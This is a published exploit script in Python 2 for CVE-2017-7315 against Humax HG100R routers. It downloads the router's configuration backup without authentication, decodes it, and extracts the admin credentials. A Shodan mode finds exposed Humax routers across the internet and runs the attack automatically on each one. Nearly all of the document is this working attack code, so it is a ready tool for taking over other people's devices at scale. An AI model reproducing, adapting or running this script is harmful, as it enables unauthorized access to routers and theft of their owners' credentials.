 
# Exploit Title: Humax Backup file download
# Date: 29/06/2017
# Exploit Author: gambler
# Vendor Homepage: http://humaxdigital.com
# Version: VER 2.0.6
# Tested on: OSX Linux
# CVE : CVE-2017-7315
 
import sys
import base64
import shodan
import requests
import subprocess
 
def banner():
    print &#039;&#039;&#039;
 ██░ ██  █    ██  ███▄ ▄███▓ ▄▄▄      ▒██   ██▒
▓██░ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    ▒▒ █ █ ▒░
▒██▀▀██░▓██  ▒██░▓██    ▓██░▒██  ▀█▄  ░░  █   ░
░▓█ ░██ ▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  ░ █ █ ▒
░▓█▒░██▓▒▒█████▓ ▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ▒██▒
 ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
 ▒ ░▒░ ░░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░░   ░▒ ░
 ░  ░░ ░ ░░░ ░ ░ ░      ░     ░   ▒    ░    ░
 ░  ░  ░   ░            ░         ░  ░ ░    ░
    &#039;&#039;&#039;
    print &#039;Description: Humax HG100R backup file download&#039;
    print &#039;Software Version: VER 2.0.6&#039;
    print &#039;SDK Version: 5.7.1mp1&#039;
    print &#039;IPv6 Stack Version: 1.2.2&#039;
    print &#039;Author: Gambler&#039;
    print &#039;Vulnerability founded: 14/03/2016&#039;
    print &#039;CVE: waiting&#039;
    print
 
def xplHelp():
    print &#039;Exploit syntax error, Example:&#039;
    print &#039;python xpl.py http://192.168.0.1&#039;
 
def exploit(server):
    path = &#039;/view/basic/GatewaySettings.bin&#039;
    if not server.startswith(&#039;http&#039;):
        server = &#039;http://%s&#039; % server
    if server.endswith(&#039;/&#039;):
        server = server[:-1]+&#039;&#039;
    url = &#039;%s/%s&#039; %(server,path)
    print &#039;[+] - Downloading configuration file and decoding&#039;
    try:
        r = requests.get(url, stream=True,timeout=10)
        for chunk in r.iter_content(chunk_size=1024):
            if chunk:
                rawdata = r.content
        save(rawdata)
    except:
        pass
 
def save(rawdata):
    config = base64.b64decode(rawdata).decode(&#039;ascii&#039;,&#039;ignore&#039;).replace(&#039;^@&#039;,&#039;&#039;)
    open(&#039;config.txt&#039;, &#039;w&#039;).write(config)
    print &#039;[+] - Done, file saved as config.txt&#039;
    infos = subprocess.Popen(["strings config.txt | grep -A 1 admin"], shell=True,stdout=subprocess.PIPE).communicate()[0]
    print &#039;[+] - Credentials found&#039;
    print infos
 
def shodanSearch():
    SHODAN_API_KEY = "SHODAN_API_KEY"
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
            results = api.search(&#039;Copyright © 2014 HUMAX Co., Ltd. All rights reserved.&#039;)
            print &#039;Results found: %s&#039; % results[&#039;total&#039;]
            for result in results[&#039;matches&#039;]:
                    router = &#039;http://%s:%s&#039; % (result[&#039;ip_str&#039;],result[&#039;port&#039;])
                    print router
                    exploit(router)
    except shodan.APIError, e:
            print &#039;Error: %s&#039; % e
 
 
if __name__ == &#039;__main__&#039;:
 
    if len(sys.argv) < 2:
        xplHelp()
        sys.exit()
    banner()
    if sys.argv[1] == &#039;shodan&#039;:
        shodanSearch()
    else:
        exploit(sys.argv[1])

